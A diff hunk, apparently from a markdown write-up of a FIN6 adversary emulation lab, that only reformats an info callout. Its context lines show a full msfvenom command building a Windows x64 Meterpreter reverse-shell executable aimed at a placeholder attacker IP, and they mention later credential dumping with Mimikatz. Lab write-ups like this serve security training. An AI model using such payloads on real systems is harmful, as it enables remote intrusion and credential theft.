@@ -49,8 +49,7 @@ Below is the typical syntax to use msfvenom:
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
 
-> In order to dump credentials with Mimikatz later in this lab, we need to use the x64 version of Windows Meterpreter TCP reverse shell
-{: .prompt-info }
+In order to dump credentials with Mimikatz later in this lab, we need to use the x64 version of Windows Meterpreter TCP reverse shell{: .prompt-info }
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}
 
